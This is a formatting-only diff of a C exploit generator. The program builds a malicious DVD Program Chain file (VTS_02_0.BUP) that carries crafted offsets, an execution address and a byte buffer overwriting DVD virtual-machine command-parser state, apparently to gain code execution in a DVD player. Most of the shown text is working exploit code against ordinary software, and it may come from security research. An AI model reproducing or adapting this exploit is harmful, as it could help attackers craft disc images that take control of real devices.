@@ -1,12 +1,13 @@
 #include "pgc.h"
 #include <stdio.h>
-#include <string.h>
 #include <stdlib.h>
+#include <string.h>
 
 #define MIN(x, y) (x > y ? y : x)
 #define MAX(x, y) (x > y ? x : y)
 
-int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
+int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr)
+{
     pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
     uint8_t *pgc_buf = NULL;
     uint32_t pgc_buf_len = 0;
@@ -14,7 +15,7 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     if (!pgc) {
         return -1;
     }
- 
+
     for (int i = 0; i < 16; ++i) {
         pgc->pgc_gi.pgc_sp_plt[i] = 0x108080;
     }
@@ -54,18 +55,14 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
         free(pgc);
         return -1;
     }
-    uint8_t vts_pgci[16] = {
-        0, 1, 0, 0,
-        0xff, 0xff, 0xff, 0xff,
-        0xff, 0xff, 0xff, 0xff,
-        0, 0, 0, 16
-    };
+    uint8_t vts_pgci[16] = {0,    1,    0,    0,    0xff, 0xff, 0xff, 0xff,
+                            0xff, 0xff, 0xff, 0xff, 0,    0,    0,    16};
 
     uint32_t end_addr = 16 + (pgc_buf_len - 1);
 
     if (*((uint16_t *)"\x00\x01") == 1) {
-        memcpy(vts_pgci+4, &end_addr, 4);
-        memcpy(vts_pgci+8, &eaddr, 4);
+        memcpy(vts_pgci + 4, &end_addr, 4);
+        memcpy(vts_pgci + 8, &eaddr, 4);
     } else {
         vts_pgci[4] = ((uint8_t *)&end_addr)[3];
         vts_pgci[5] = ((uint8_t *)&end_addr)[2];
@@ -110,30 +107,41 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
 #define NEW_PGC_SECT "\x00\x00\x00\x2e"
 
-int main() {
+int main()
+{
     printf("CMDT_SA: %x\n", CMDT_SA);
     printf("NEEDED_LEN: %x\n", NEEDED_LEN);
 
-    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
+    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN,
+                             EXEC_ADDR) < 0) {
         return -1;
     }
 
     uint8_t buf[24] = {
         0x00, // VM_current_cmd_type_index
         0x00, // VM_current_cmd_index
-        0x00, 0x00, // padding
-        0xa8, 0x1d, 0x55, 0x01, // VM_current_cmd_data
-        0x01, // DAT_01558e48
+        0x00,
         0x00, // padding
-        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
+        0xa8,
+        0x1d,
+        0x55,
+        0x01,                                         // VM_current_cmd_data
+        0x01,                                         // DAT_01558e48
+        0x00,                                         // padding
+        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff,        // FP_INDEX_lo
         (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff, // FP_INDEX_lo_hi
-        0x00, 0x00, // VM_current_opcode_type
+        0x00,
+        0x00, // VM_current_opcode_type
         0x00, // VM_current_opcode_direct
         0x00, // padding
-        0x00, 0x00, // VM_current_opcode_set
-        0x00, 0x00, // VM_current_opcode_dir_cmp
-        0x03, 0x00, // VM_current_opcode_cmp
-        0x00, 0x00 // VM_current_opcode_cmd
+        0x00,
+        0x00, // VM_current_opcode_set
+        0x00,
+        0x00, // VM_current_opcode_dir_cmp
+        0x03,
+        0x00, // VM_current_opcode_cmp
+        0x00,
+        0x00 // VM_current_opcode_cmd
     };
 
     FILE *fp = fopen("./build/jump.bin", "rb");
